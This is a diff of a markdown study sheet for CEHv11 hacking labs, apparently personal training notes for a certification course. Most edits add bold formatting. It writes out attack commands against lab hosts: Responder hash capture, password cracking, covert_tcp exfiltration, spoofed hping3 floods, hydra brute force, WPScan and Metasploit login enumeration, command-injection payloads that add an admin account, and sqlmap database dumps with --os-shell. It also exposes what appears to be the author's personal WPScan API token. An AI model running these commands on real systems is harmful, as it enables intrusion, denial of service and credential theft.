@@ -10,7 +10,7 @@
 - **nmap -sn -PE [IP or IP Range]**
   - **-PE:** ICMP ECHO ping scan
 - **nmap -sn -PP [IP]**
-  - **-PU:** ICMP timestamp ping scan
+  - **-PP:** ICMP timestamp ping scan
 - **nmap -sn -PM [IP]**
   - **-PM:** ICMP address mask ping scan
 - **nmap -sn -PS [IP]**
@@ -61,7 +61,7 @@
 **Lab2-Task1: Enumerate SNMP using snmp-check**
 
 - nmap -sU -p 161 [IP]
-- snmp-check [IP]
+- **snmp-check [IP]**
 
 **Addition**
 
@@ -76,7 +76,7 @@
   - cd
   - cd Responder
   - chmox +x ./Responder.py
-  - sudo ./Responder.py -I eth0
+  - **sudo ./Responder.py -I eth0**
   - passwd: \*\*\*\*
 - **Windows**
   - run
@@ -85,7 +85,7 @@
   - Home/Responder/logs/SMB-NTMLv2-SSP-[IP].txt
   - sudo snap install john-the-ripper
   - passwd: \*\*\*\*
-  - sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt
+  - **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**
 
 **Lab3-Task6: Covert Channels using Covert\_TCP**
 
@@ -96,12 +96,12 @@
   - echo &quot;Secret&quot;\&gt;message.txt
   - Place-\&gt;Network
   - Ctrl+L
-  - smb://[IP]
+  - **smb://[IP]**
   - Account &amp; Password
   - copy and paste covert\_tcp.c
-  - cc -o covert\_tcp covert\_tcp.c
+  - **cc -o covert\_tcp covert\_tcp.c**
 - **Target:**
-  - tcpdump -nvvx port 8888 -I lo
+  - **tcpdump -nvvx port 8888 -I lo**
   - cd Desktop
   - mkdir Receive
   - cd Receive
@@ -109,10 +109,10 @@
   - smb://[IP]
   - copy and paste covert\_tcp.c
   - cc -o covert\_tcp covert\_tcp.c
-  - ./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
-  - Tcpdump captures no packets
+  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
+  - **Tcpdump captures no packets**
 - **Attacker**
-  - ./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt
+  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
   - Wireshark (message string being send in individual packet)
 
 **Lab0-Task0: Rainbowcrack and QuickStego**
@@ -146,7 +146,7 @@
 - **Attacker**
   - Stop capture
   - File-\&gt;Save as
-  - Filter: http.request.method==POST
+  - Filter: **http.request.method==POST**
   - RDP log in Target
   - service
   - start Remote Packet Capture Protocol v.0 (experimental)
@@ -167,7 +167,7 @@
 - **Target:**
   - Wireshark-\&gt;Ethernet
 - **Attacker**
-  - hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood
+  - **hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood**
     - **-S: Set the SYN flag**
     - **-a: Spoof the IP address**
     - **-p: Specify the destination port**
@@ -175,12 +175,12 @@
 - **Target**
   - Check wireshark
 - **Attacker (Perform PoD)**
-  - hping3 -d 65538 -S -p 21 –flood [Target IP]
+  - **hping3 -d 65538 -S -p 21 –flood [Target IP]**
     - **-d: Specify data size**
     - **-S: Set the SYN flag**
 - **Attacker (Perform UDP application layer flood attack)**
   - nmap -p 139 10.10.10.19 (check service)
-  - hping3 -2 -p 139 –flood [IP]
+  - **hping3 -2 -p 139 –flood [IP]**
     - **-2: Specify UDP mode**
 - **Other UDP-based applications and their ports**
   - CharGen UDP Port 19
@@ -200,7 +200,7 @@
 **Lab2-Task1: Crack FTP Credentials using a Dictionary Attack**
 
 - nmap -p 21 [IP]
-- hydra -L /home/attacker/Desktop/Wordlists/usernames.txt -P /home/attacker/Desktop/Wordlists/passwords.txt ftp://10.10.10.10
+- **hydra -L /home/attacker/Desktop/Wordlists/usernames.txt -P /home/attacker/Desktop/Wordlists/passwords.txt ftp://10.10.10.10**
 
 **Module 14: Hacking Web Applications**
 
@@ -216,7 +216,7 @@
 - select account and password value, Add $
 - Payloads: Load wordlist file for set 1 and set 2
 - start attack
-- filter status==302
+- **filter status==302**
 - open the raw, get the credentials
 - recover proxy settings
 
@@ -227,18 +227,19 @@
 
 **Lab2-Task5: Enumerate and Hack a Web Application using WPScan and Metasploit**
 
-- wpscan –api-token [API Token] –url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u
+- **wpscan –api-token [API Token] –url**  **http://10.10.10.16:8080/CEH**  **--plugins-detection aggressive --enumerate** u
   - **--enumerate u: Specify the enumeration of users**
-  - **API Token: Register at**  **https://wpscan.com/register**
+  - **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
+  - **Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
 - service postgresql start
 - msfconsole
-- use auxiliary/scanner/http/wordpress\_login\_enum
+- **use auxiliary/scanner/http/wordpress\_login\_enum**
 - show options
-- set PASS\_FILE /home/attacker/Desktop/CEHv11 Module 14 Hacking Web Applications/Wordlist/password.txt
-- set RHOST 10.10.10.16
-- set RPORT 8080
-- set TARGETURI http://10.10.10.16:8080/CEH
-- set USERNAME admin
+- **set PASS\_FILE /home/attacker/Desktop/CEHv11 Module 14 Hacking Web Applications/Wordlist/password.txt**
+- **set RHOST 10.10.10.16**
+- **set RPORT 8080**
+- **set TARGETURI**  **http://10.10.10.16:8080/CEH**
+- **set USERNAME admin**
 - run
 - Find the credential
 
@@ -247,14 +248,14 @@
 - If found command injection vulnerability in an input textfield
 - | hostname
 - | whoami
-- | tasklist| Taskkill /PID /F
+- **| tasklist| Taskkill /PID /F**
   - **/PID: Process ID value od the process**
   - **/F: Forcefully terminate the process**
 - | dir C:\
-- | net user
-- | net user user001 /Add
-- | net user user001
-- | net localgroup Administrators user001 /Add
+- **| net user**
+- **| net user user001 /Add**
+- **| net user user001**
+- **| net localgroup Administrators user001 /Add**
 - Use created account user001 to log in remotely
 
 **Module 15: SQL Injection**
@@ -264,20 +265,20 @@
 - Login a website
 - Inspect element
 - Dev tools-\&gt;Console: document.cookie
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value that you copied in Step 8]&quot; –dbs
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value that you copied in Step 8]&quot; –dbs**
   - **-u: Specify the target URL**
   - **--cookie: Specify the HTTP cookie header value**
   - **--dbs: Enumerate DBMS databases**
 - Get a list of databases
 - Select a database to extract its tables
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; -D moviescope –tables
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; -D moviescope –tables**
   - **-D: Specify the DBMS database to enumerate**
   - **--tables: Enumerate DBMS database tables**
 - Get a list of tables
 - Select a column
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; -D moviescope –T User\_Login --dump
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; -D moviescope –T User\_Login --dump**
 - Get table data of this column
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; --os-shell
+- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;[cookie value which you have copied in Step 8]&quot; --os-shell**
 - Get the OS Shell
 - TASKLIST
 
